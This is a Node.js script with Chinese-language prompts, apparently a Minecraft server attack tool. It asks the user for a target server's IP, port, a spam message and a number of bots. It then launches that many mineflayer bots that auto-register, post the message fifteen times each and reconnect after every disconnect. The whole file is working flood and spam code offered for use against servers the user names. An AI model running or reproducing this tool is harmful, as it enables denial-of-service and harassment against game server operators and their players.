require("prompt-sync")
const ps = require("prompt-sync");
const prompt = ps();
let cn = Math.floor((Math.random() * 10000000) + 1);
console.log("你的验证码是 - " + cn)
let i
i = prompt("输入上面的验证码:")
while(i!=cn){
i = prompt("密码错误，请重逝")
}
console.log("密码正确")

let host = prompt("输入服务器IP:")
let port = prompt("输入改服务器的端口:")
let spam = prompt("写出你要对服务器发送的信息:")

const mineflayer = require('mineflayer');

let botArgs = {
  host: host,
  port: port,
  version: '1.19'
};

class MCBot {

  constructor(username) {
    this.username = username;
    this.host = botArgs["host"];
    this.port = botArgs["port"];
    this.version = botArgs["version"];

    this.initBot();
  }

  initBot() {
    this.bot = mineflayer.createBot({
      "username": this.username,
      "host": this.host,
      "port": this.port,
      "version": this.version
    });

    this.initEvents()
  }

  initEvents() {
    this.bot.on('login', () => {
      let botSocket = this.bot._client.socket;
      console.log(`[${this.username}] Logged in to ${botSocket.server ? botSocket.server : botSocket._host}`);
    });

    this.bot.on('end', (reason) => {
      console.log(`[${this.username}] Disconnected: ${reason}`);

      if (reason == "disconnect.quitting") {
        return
      }

      setTimeout(() => this.initBot(), 1000);
    });

    this.bot.on('spawn', async () => {
      console.log(`[${this.username}] Spawned in`);
      await this.bot.waitForTicks(0);
      this.bot.chat("/register anonyone_force anonyone_force");
      await this.bot.waitForTicks(0);
      this.bot.chat("/login anonyone_force");
      await this.bot.waitForTicks(0);
      this.bot.chat("/register anonyone_force");
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
      await this.bot.waitForTicks(0);
      this.bot.chat(spam);
      
    });

    this.bot.on('error', (err) => {
      if (err.code == 'ECONNREFUSED') {
        console.log(`[${this.username}] Failed to connect to ${err.address}:${err.port}`)
      }
      else {
        console.log(`[${this.username}] Unhandled error: ${err}`);
      }
    });
  }
}
let n = prompt("你想发送多少个机器人来执行攻击? :")
let usernamee = prompt("机器人名称···(14个字以下)")
let bots = [];
for(var num = 0; num < n; num++) {
    bots.push(new MCBot(usernamee+num))
}